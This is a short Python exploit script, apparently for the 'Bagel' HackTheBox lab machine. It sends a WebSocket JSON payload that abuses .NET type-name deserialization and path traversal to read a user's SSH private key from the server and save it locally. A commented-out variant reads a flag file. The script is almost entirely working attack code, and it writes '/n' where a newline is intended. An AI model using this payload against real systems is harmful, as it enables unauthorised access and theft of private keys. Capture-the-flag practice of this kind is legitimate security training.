import websocket, json


def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://bagel.htb:5000/") # connect to order app
        order = {"RemoveOrder": {
            "$type": "bagel_server.File, bagel",
            "ReadFile": "../../../../../../../home/developer/.ssh/id_rsa"
        }}

        # order =  { "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/user.txt"}}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        
        with open("phil.key", "w") as f:
            f.write(json.loads(result)["RemoveOrder"]["ReadFile"] + '/n')

    except:
        return("Unable to connect")


order()
